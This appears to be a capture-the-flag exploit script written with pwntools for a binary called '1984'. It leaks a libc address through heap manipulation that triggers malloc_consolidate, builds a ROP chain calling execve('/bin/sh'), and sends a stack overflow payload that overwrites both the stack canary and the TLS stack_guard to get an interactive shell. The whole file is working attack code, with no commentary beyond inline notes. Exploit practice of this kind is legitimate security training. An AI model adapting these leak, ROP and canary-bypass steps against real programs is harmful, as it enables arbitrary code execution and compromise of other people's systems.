import pwn
import os
import re

PIG = b'1'
COW = b'2'
SHEEP = b'3'

LUNCH_SALAD = b'0'
LUNCH_COW = b'1'
LUNCH_PIG = b'2'
LUNCH_SHEEP = b'3'

def main():
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "glibc", 'libc.so.6')}
    p = pwn.process('./1984', stdout=pwn.process.PIPE, env=env)
    input('Pause to attach GDB, if necessary\n')

    # ===== ASLR bypass =====
    # Create and free a number of fastbin mallocs
    data = p.readuntil('[#]')
    for i in range(5):
        buy_animal(p, PIG, b'a' * 64)
        buy_animal(p, COW, b'a' * 64)
    for i in range(5):
        buy_lunch(p, LUNCH_PIG)
        buy_lunch(p, LUNCH_COW)
    # Trigger malloc_consolidate for the freed fastbin mallocs to put them in the unsorted bin
    buy_animal(p, b'0' * (2 ** 16) + PIG, b'\r') # This successfully triggers malloc_consolidate (verified with GDB)
    buy_lunch(p, LUNCH_PIG)
    # Create a number of unsorted bin mallocs
    for i in range(5):
        buy_animal(p, PIG, b'\r')
        buy_animal(p, COW, b'\r')
    libc_leak_hex = buy_lunch(p, LUNCH_PIG) # Leaks libc address: main_arena (approximately, our \r corrupts the LSB)
    print("libc leak: '{}'".format(bytes_to_string(libc_leak_hex)))
    libc_leak_bytes = libc_leak_hex + b'\x00\x00'
    writeable_addr_bytes = libc_leak_bytes # It looks like the main_arena address is writeable
    assert len(writeable_addr_bytes) == 8
    print("writeable addr: '{}'".format(bytes_to_string(writeable_addr_bytes)))
    libc_leak_int = pwn.u64(libc_leak_bytes)
    libc_base = (libc_leak_int & 0xfffffffffffff000) - 0x1fa000
    print("libc base: 0x{:x}".format(libc_base))

    # ===== Payload Creation =====

    libc = pwn.ELF(os.path.join(os.getcwd(), 'glibc', 'libc.so.6'))
    pwn.context.binary = libc
    libc.address = libc_base
    execve_address = libc.symbols['execve']
    print("execve address: 0x{:x}".format(execve_address))

    rop = pwn.ROP(libc)

    bin_sh_addr = next(libc.search(b'/bin/sh'))
    print("/bin/sh addr: 0x{:x}".format(bin_sh_addr))
    rop.execve(bin_sh_addr, 0, 0)

    #rop_chain = b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
    rop_chain = rop.chain()
    print("ROP chain: {}".format(rop_chain))
    my_canary = b'bbbbbbbb'
    assert len(my_canary) == 8
    payload = b'6\n' # Check out
    payload +=  b'a' * 24 # Fill the buffer
    payload += my_canary # Overwrite canary
    payload += b'd' * 8 # padding to return address
    payload += rop_chain # Overwrite the return address with our ROP chain
    payload += b'd' * (128 - len(rop_chain)) # Padding to fake stack_guard
    payload += my_canary # Overwrite fake stack_guard (This doesn't have to be my_canary)
    payload += (writeable_addr_bytes) * (1928 // 8) # Padding to actual stack_guard (pad with a writeable address to circumvent segfault)
    payload += my_canary

    # ===== Exploit =====
    p.send(payload)

    p.interactive()

def buy_animal(p, animal, name):
    p.sendline(animal)
    data1 = p.readuntil('Enter Name:')
    p.send(name)
    data2 = p.readuntil('[#]')

def buy_lunch(p, lunch):
    p.sendline(b'5') # Eat lunch
    data1 = p.readuntil('Your choice:')
    p.sendline(lunch) # lunch choice
    data2 = p.readuntil('[#]')
    if lunch != LUNCH_SALAD:
        m = re.search(b'seen (?P<extracted_name>.*?) around lately?', data2)
        assert m is not None, "Could not extract name from: {}".format(data2)
        extracted_name = m.group('extracted_name')
        return extracted_name

def bytes_to_string(bs):
    return ''.join(['\\x{:02x}'.format(i) for i in bs])


if __name__ == "__main__":
    main()
